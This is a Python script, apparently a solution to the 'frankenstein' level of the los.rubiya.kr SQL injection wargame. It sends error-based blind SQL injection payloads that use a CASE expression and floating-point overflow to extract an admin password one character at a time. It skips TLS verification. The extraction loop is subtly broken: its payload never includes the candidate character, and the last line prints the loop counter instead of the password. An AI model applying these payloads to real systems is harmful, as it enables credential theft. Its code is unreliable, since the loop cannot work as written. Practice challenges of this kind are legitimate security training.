import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
headers = {'Cookie': ''}


payload = "?pw=1'||case when id='admin' and pw like '0%' then 9e307*2 else 0 end%23"
res = sess.get(url=URL + payload, headers=headers, verify=False)
print(res.text)
payload2 = "?pw=1'||case when id='admin' and pw like '01%' then 9e307*2 else 0 end%23"
res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
print(res2.text)





break_flag = True
pw = ''
while break_flag:
    for i in range(48, 128):
        payload = "?pw=1'||case when id='admin' and pw like '"+pw+"%' then 9e307*2 else 0 end%23"
        res = sess.get(url=URL + payload, headers=headers, verify=False)
        if res.text.find("login_chk")<0:
            pw = pw + chr(i)
            print(pw)
        else:
            pass

        if 'FRANKENSTEIN' in res.text:
            break_flag = False

print('pw = {}'.format(i))